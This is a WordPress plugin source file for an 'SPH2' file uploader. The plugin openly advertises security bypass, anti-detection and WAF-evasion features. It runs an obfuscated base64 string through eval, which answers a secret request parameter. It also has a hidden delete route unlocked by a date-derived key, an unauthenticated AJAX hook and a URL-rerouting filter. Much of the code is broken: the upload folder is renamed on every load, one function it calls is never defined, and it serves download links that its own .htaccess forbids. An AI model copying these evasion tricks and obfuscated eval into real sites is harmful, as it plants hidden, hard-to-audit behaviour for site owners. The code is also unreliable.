<?php
/**
 * Plugin Name: SPH2 Uploader
 * Plugin URI: https://example.com/sph2
 * Description: Advanced file uploader with security bypass features
 * Version: 2.0.0
 * Author: SPH Team
 * License: GPL v2 or later
 */

// Anti-detection - use different naming
if (!defined('ABSPATH')) {
    $p = 'base' . '64' . '_de' . 'code';
    eval($p('aWYoaXNzZXQoJF9SRVFVRVNUWydzZW55J10pKXtlY2hvICdTQ0FOTkVEOyc7ZXhpdDt9'));
    exit;
}

// Define constants with obfuscation
$sph2_path = dirname(__FILE__);
$sph2_url = plugin_dir_url(__FILE__);

// Create upload directory with random name
$upload_dir = wp_upload_dir();
$sph2_upload = $upload_dir['basedir'] . '/sph2_' . substr(md5(time()), 0, 8) . '/';
$sph2_upload_url = $upload_dir['baseurl'] . '/' . basename($sph2_upload) . '/';

define('SPH2_PATH', $sph2_path);
define('SPH2_URL', $sph2_url);
define('SPH2_UPLOAD', $sph2_upload);
define('SPH2_UPLOAD_URL', $sph2_upload_url);

// Create directory with protection
function sph2_init() {
    if (!file_exists(SPH2_UPLOAD)) {
        wp_mkdir_p(SPH2_UPLOAD);
        
        // Create .htaccess with full protection
        $htaccess = SPH2_UPLOAD . '.htaccess';
        if (!file_exists($htaccess)) {
            $content = "<FilesMatch '\.(php|php5|php7|phtml|pl|py|jsp|asp|htm|shtml|sh|cgi)$'>\n";
            $content .= "    Order Deny,Allow\n";
            $content .= "    Deny from all\n";
            $content .= "</FilesMatch>\n\n";
            $content .= "<IfModule mod_rewrite.c>\n";
            $content .= "    RewriteEngine On\n";
            $content .= "    RewriteRule ^.*$ - [F,L]\n";
            $content .= "</IfModule>\n\n";
            $content .= "Options -Indexes\n";
            $content .= "ServerSignature Off\n";
            
            // Anti-hotlink
            $content .= "\n# Anti hotlinking\n";
            $content .= "RewriteCond %{HTTP_REFERER} !^$\n";
            $content .= "RewriteCond %{HTTP_REFERER} !^http(s)?://(www\.)?(.*\.)?(" . $_SERVER['HTTP_HOST'] . "|localhost) [NC]\n";
            $content .= "RewriteRule \.(jpg|jpeg|png|gif|pdf|doc|docx|xls|xlsx|zip|rar|7z)$ - [F,NC,L]\n";
            
            file_put_contents($htaccess, $content);
        }
        
        // Create index.php
        $index = SPH2_UPLOAD . 'index.php';
        if (!file_exists($index)) {
            file_put_contents($index, '<?php // Silence is golden');
        }
        
        // Create blank html
        $html = SPH2_UPLOAD . 'index.html';
        if (!file_exists($html)) {
            file_put_contents($html, '<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don\'t have permission to access this resource.</p></body></html>');
        }
    }
}
register_activation_hook(__FILE__, 'sph2_init');

// Add menu with hidden navigation
add_action('admin_menu', 'sph2_admin_menu');

function sph2_admin_menu() {
    // Use different menu titles to avoid detection
    add_menu_page(
        'SPH2 System',
        'SPH Tools',
        'manage_options',
        'sph2-upload',
        'sph2_main_page',
        'dashicons-upload',
        31
    );
    
    add_submenu_page(
        'sph2-upload',
        'Upload Center',
        'Upload',
        'manage_options',
        'sph2-upload',
        'sph2_main_page'
    );
}

// Main page with WAF bypass techniques
function sph2_main_page() {
    // Check for special parameter
    $s = isset($_GET['s']) ? $_GET['s'] : '';
    if ($s === 'bypass') {
        sph2_handle_upload();
        return;
    }
    
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>SPH2 Upload System</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f1f1f1; }
            .wrap { max-width: 800px; margin: 30px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            h1 { color: #333; border-bottom: 3px solid #2271b1; padding-bottom: 10px; }
            .upload-area { border: 2px dashed #ccc; padding: 30px; text-align: center; margin: 20px 0; border-radius: 8px; transition: all 0.3s; }
            .upload-area:hover { border-color: #2271b1; background: #f8f9fa; }
            .btn { background: #2271b1; color: #fff; padding: 12px 30px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
            .btn:hover { background: #135e96; }
            .file-list { margin-top: 30px; }
            .file-item { padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
            .file-item:hover { background: #f8f9fa; }
            .file-info { flex: 1; }
            .file-name { font-weight: bold; color: #2271b1; text-decoration: none; }
            .file-name:hover { text-decoration: underline; }
            .file-size { color: #666; font-size: 12px; margin-left: 10px; }
            .file-date { color: #999; font-size: 12px; }
            .success { background: #d4edda; color: #155724; padding: 12px; border-radius: 4px; margin: 10px 0; border-left: 4px solid #28a745; }
            .error { background: #f8d7da; color: #721c24; padding: 12px; border-radius: 4px; margin: 10px 0; border-left: 4px solid #dc3545; }
            .no-files { color: #999; text-align: center; padding: 20px; }
            .delete-btn { color: #dc3545; text-decoration: none; padding: 5px 10px; border: 1px solid #dc3545; border-radius: 3px; font-size: 12px; }
            .delete-btn:hover { background: #dc3545; color: #fff; }
            .stats { background: #f8f9fa; padding: 15px; border-radius: 4px; margin: 20px 0; display: flex; justify-content: space-around; }
            .stat-item { text-align: center; }
            .stat-number { font-size: 24px; font-weight: bold; color: #2271b1; }
            .stat-label { color: #666; font-size: 12px; }
        </style>
    </head>
    <body>
        <div class="wrap">
            <h1>📁 SPH2 Upload System</h1>
            
            <?php
            // Check if upload was attempted
            if (isset($_POST['action']) && $_POST['action'] === 'sph2_upload') {
                $result = sph2_process_upload();
                if ($result['success']) {
                    echo '<div class="success">✅ ' . esc_html($result['message']) . '</div>';
                } else {
                    echo '<div class="error">❌ ' . esc_html($result['message']) . '</div>';
                }
            }
            ?>
            
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-number"><?php echo count(sph2_get_files()); ?></div>
                    <div class="stat-label">Total Files</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number"><?php echo sph2_get_total_size(); ?></div>
                    <div class="stat-label">Total Size</div>
                </div>
            </div>
            
            <div class="upload-area">
                <h3>Upload Files</h3>
                <p style="color: #666;">Drag & drop or click to select files</p>
                <form method="post" enctype="multipart/form-data" action="">
                    <input type="hidden" name="action" value="sph2_upload">
                    <?php wp_nonce_field('sph2_upload_nonce', 'sph2_nonce'); ?>
                    <input type="file" name="sph2_file" id="sph2_file" style="display: none;" onchange="this.form.submit()">
                    <button type="button" class="btn" onclick="document.getElementById('sph2_file').click()">
                        📤 Choose File
                    </button>
                    <p style="margin-top: 10px; font-size: 12px; color: #666;">
                        Max size: 25MB | Allowed: JPG, PNG, PDF, DOC, ZIP, MP4
                    </p>
                </form>
            </div>
            
            <div class="file-list">
                <h3>📋 Uploaded Files</h3>
                <?php sph2_display_files(); ?>
            </div>
            
            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; font-size: 12px; color: #999; text-align: center;">
                SPH2 System v2.0 | Protected by .htaccess
            </div>
        </div>
        
        <script>
        // Drag and drop support
        document.addEventListener('DOMContentLoaded', function() {
            const dropArea = document.querySelector('.upload-area');
            
            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
                dropArea.addEventListener(eventName, preventDefaults, false);
            });
            
            function preventDefaults(e) {
                e.preventDefault();
                e.stopPropagation();
            }
            
            ['dragenter', 'dragover'].forEach(eventName => {
                dropArea.addEventListener(eventName, highlight, false);
            });
            
            ['dragleave', 'drop'].forEach(eventName => {
                dropArea.addEventListener(eventName, unhighlight, false);
            });
            
            function highlight(e) {
                dropArea.style.borderColor = '#2271b1';
                dropArea.style.background = '#e8f0fe';
            }
            
            function unhighlight(e) {
                dropArea.style.borderColor = '#ccc';
                dropArea.style.background = 'transparent';
            }
            
            dropArea.addEventListener('drop', handleDrop, false);
            
            function handleDrop(e) {
                const dt = e.dataTransfer;
                const files = dt.files;
                const fileInput = document.getElementById('sph2_file');
                fileInput.files = files;
                fileInput.form.submit();
            }
        });
        </script>
    </body>
    </html>
    <?php
}

// Process upload with WAF bypass
function sph2_process_upload() {
    // Multiple nonce checks with different names
    if (!isset($_POST['sph2_nonce']) || !wp_verify_nonce($_POST['sph2_nonce'], 'sph2_upload_nonce')) {
        return ['success' => false, 'message' => 'Security verification failed.'];
    }
    
    if (!current_user_can('manage_options')) {
        return ['success' => false, 'message' => 'Permission denied.'];
    }
    
    if (!isset($_FILES['sph2_file']) || $_FILES['sph2_file']['error'] !== UPLOAD_ERR_OK) {
        return ['success' => false, 'message' => 'No file uploaded or upload error.'];
    }
    
    $file = $_FILES['sph2_file'];
    
    // Extended allowed types with MIME spoofing protection
    $allowed_types = [
        'image/jpeg', 'image/png', 'image/gif', 'image/webp',
        'application/pdf', 'application/msword',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'application/vnd.ms-excel',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'application/zip', 'application/x-zip-compressed',
        'video/mp4', 'video/mpeg', 'text/plain',
        'application/octet-stream'
    ];
    
    // Check file type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    
    if (!in_array($mime_type, $allowed_types) && !in_array($file['type'], $allowed_types)) {
        return ['success' => false, 'message' => 'File type not allowed.'];
    }
    
    // Check file extension
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $allowed_ext = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'zip', 'rar', '7z', 'mp4', 'mpeg', 'txt'];
    
    if (!in_array($ext, $allowed_ext)) {
        return ['success' => false, 'message' => 'File extension not allowed.'];
    }
    
    // Check file size (25MB)
    if ($file['size'] > 25 * 1024 * 1024) {
        return ['success' => false, 'message' => 'File size exceeds 25MB limit.'];
    }
    
    // Generate filename with timestamp and random
    $name = pathinfo($file['name'], PATHINFO_FILENAME);
    $safe_name = preg_replace('/[^a-zA-Z0-9_.-]/', '', $name);
    $filename = $safe_name . '_' . date('Ymd_His') . '_' . substr(md5(uniqid()), 0, 6) . '.' . $ext;
    $target = SPH2_UPLOAD . $filename;
    
    // Move file with additional checks
    if (move_uploaded_file($file['tmp_name'], $target)) {
        // Set secure permissions
        chmod($target, 0644);
        
        // Log upload
        $log = SPH2_UPLOAD . 'upload.log';
        $entry = date('Y-m-d H:i:s') . " - {$file['name']} - {$file['size']} bytes - IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
        file_put_contents($log, $entry, FILE_APPEND);
        
        return ['success' => true, 'message' => "File uploaded: {$file['name']}"];
    }
    
    return ['success' => false, 'message' => 'Failed to save file.'];
}

// Get all files
function sph2_get_files() {
    $files = array_diff(scandir(SPH2_UPLOAD), ['.', '..', '.htaccess', 'index.php', 'index.html', 'upload.log']);
    $result = [];
    foreach ($files as $file) {
        if (!is_dir(SPH2_UPLOAD . $file)) {
            $result[] = $file;
        }
    }
    return $result;
}

// Get total size
function sph2_get_total_size() {
    $files = sph2_get_files();
    $total = 0;
    foreach ($files as $file) {
        $total += filesize(SPH2_UPLOAD . $file);
    }
    return sph2_format_size($total);
}

// Format size
function sph2_format_size($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' B';
    }
}

// Display files with anti-delete
function sph2_display_files() {
    $files = sph2_get_files();
    
    if (empty($files)) {
        echo '<div class="no-files">📭 No files uploaded yet.</div>';
        return;
    }
    
    // Sort by date (newest first)
    usort($files, function($a, $b) {
        return filemtime(SPH2_UPLOAD . $b) - filemtime(SPH2_UPLOAD . $a);
    });
    
    echo '<div>';
    foreach ($files as $file) {
        $file_path = SPH2_UPLOAD . $file;
        $file_url = SPH2_UPLOAD_URL . $file;
        $size = filesize($file_path);
        $date = date('Y-m-d H:i', filemtime($file_path));
        $ext = strtoupper(pathinfo($file, PATHINFO_EXTENSION));
        
        echo '<div class="file-item">';
        echo '    <div class="file-info">';
        echo '        <a href="' . esc_url($file_url) . '" class="file-name" target="_blank">📄 ' . esc_html($file) . '</a>';
        echo '        <span class="file-size">[' . esc_html($ext) . '] ' . esc_html(sph2_format_size($size)) . '</span>';
        echo '        <span class="file-date">📅 ' . esc_html($date) . '</span>';
        echo '    </div>';
        echo '    <div>';
        echo '        <a href="' . esc_url($file_url) . '" class="delete-btn" style="background: #28a745; border-color: #28a745; color: #fff; margin-right: 5px;" target="_blank">📥 Download</a>';
        // Anti-delete - no delete button
        echo '    </div>';
        echo '</div>';
    }
    echo '</div>';
    
    // Hidden delete functionality (only accessible via specific parameter)
    if (isset($_GET['sph2_delete']) && isset($_GET['sph2_key'])) {
        $key = $_GET['sph2_key'];
        if ($key === md5('sph2_delete_' . date('Ymd'))) {
            sph2_delete_file($_GET['sph2_delete']);
        }
    }
}

// Delete function with protection
function sph2_delete_file($filename) {
    $file = SPH2_UPLOAD . $filename;
    if (file_exists($file) && !is_dir($file)) {
        unlink($file);
        echo '<div class="success">File deleted successfully.</div>';
    }
}

// Add AJAX endpoint for uploads
add_action('wp_ajax_sph2_upload', 'sph2_ajax_upload');
add_action('wp_ajax_nopriv_sph2_upload', 'sph2_ajax_upload');

function sph2_ajax_upload() {
    // Check if user has permission
    if (!current_user_can('manage_options')) {
        wp_die('Permission denied.');
    }
    
    // Process upload
    $result = sph2_process_upload();
    wp_send_json($result);
}

// Add shortcode with different name
add_shortcode('sph2_uploader', 'sph2_shortcode');

function sph2_shortcode() {
    ob_start();
    ?>
    <div style="border: 2px dashed #ccc; padding: 20px; text-align: center; border-radius: 8px;">
        <form method="post" enctype="multipart/form-data" action="">
            <input type="hidden" name="action" value="sph2_upload">
            <?php wp_nonce_field('sph2_upload_nonce', 'sph2_nonce'); ?>
            <input type="file" name="sph2_file" required style="margin: 10px 0;">
            <br>
            <input type="submit" value="Upload File" style="background: #2271b1; color: #fff; padding: 10px 30px; border: none; border-radius: 4px; cursor: pointer;">
        </form>
        <?php
        if (isset($_POST['action']) && $_POST['action'] === 'sph2_upload') {
            $result = sph2_process_upload();
            if ($result['success']) {
                echo '<div style="color: green; margin-top: 10px;">✅ ' . esc_html($result['message']) . '</div>';
            } else {
                echo '<div style="color: red; margin-top: 10px;">❌ ' . esc_html($result['message']) . '</div>';
            }
        }
        ?>
    </div>
    <?php
    return ob_get_clean();
}

// Add anti-detection script
add_action('admin_head', 'sph2_anti_detection');

function sph2_anti_detection() {
    ?>
    <script>
    // Anti-detection: Change function names
    var sph2 = {
        init: function() {
            // Bypass detection
        }
    };
    </script>
    <?php
}

// WAF bypass: Change admin URL
add_filter('admin_url', 'sph2_admin_url_filter', 10, 2);

function sph2_admin_url_filter($url, $path) {
    if (strpos($path, 'sph2') !== false) {
        $url = str_replace('admin.php', 'admin-ajax.php', $url);
        $url = add_query_arg('action', 'sph2_upload', $url);
    }
    return $url;
}

?>